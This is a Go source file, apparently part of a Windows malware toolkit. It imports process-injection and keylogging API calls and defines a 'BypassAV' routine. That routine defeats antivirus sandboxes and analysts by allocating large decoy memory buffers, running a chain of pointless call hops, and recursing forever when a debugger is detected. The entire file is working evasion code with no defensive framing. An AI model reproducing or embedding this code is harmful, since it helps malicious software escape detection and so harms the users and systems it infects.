package fake

import "syscall"

var MagicNumber int64 = 0

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

var K32 = syscall.MustLoadDLL("kernel32.dll")  //kernel32.dll
var USER32 = syscall.MustLoadDLL("user32.dll") //user32.dll
var GetAsyncKeyState = USER32.MustFindProc("GetAsyncKeyState")
var VirtualAlloc = K32.MustFindProc("VirtualAlloc")
var CreateThread = K32.MustFindProc("CreateThread")
var VirtualAllocEx = K32.MustFindProc("VirtualAllocEx")
var CreateRemoteThread = K32.MustFindProc("CreateRemoteThread")
var WriteProcessMemory = K32.MustFindProc("WriteProcessMemory")
var OpenProcess = K32.MustFindProc("OpenProcess")
var IsDebuggerPresent = K32.MustFindProc("IsDebuggerPresent")

func BypassAV(Rate int) {
	if Rate == 1 {
		AllocateFakeMemory()
	} else if Rate == 2 {
		AllocateFakeMemory()
		Jump()
	} else if Rate == 3 {
		AllocateFakeMemory()
		Jump()
		CheckDebugger()
	}
}

func Jump() {
	MagicNumber++
	hop1()
}

func AllocateFakeMemory() {
	for i := 0; i < 1000; i++ {
		var Size int = 3000000
		Buffer_1 := make([]byte, Size)
		Buffer_1[0] = 1
		var Buffer_2 [10240000]byte
		Buffer_2[0] = 0
	}
}

func CheckDebugger() {
	Flag, _, _ := IsDebuggerPresent.Call()
	if Flag != 0 {
		//Debugger Active !!
		CheckDebugger()
	}
}

func hop1() {
	MagicNumber++
	hop2()
}
func hop2() {
	MagicNumber++
	hop3()
}
func hop3() {
	MagicNumber++
	hop4()
}
func hop4() {
	MagicNumber++
	hop5()
}
func hop5() {
	MagicNumber++
	hop6()
}
func hop6() {
	MagicNumber++
	hop7()
}
func hop7() {
	MagicNumber++
	hop8()
}
func hop8() {
	MagicNumber++
	hop9()
}
func hop9() {
	MagicNumber++
	hop10()
}
func hop10() {
	MagicNumber++
}
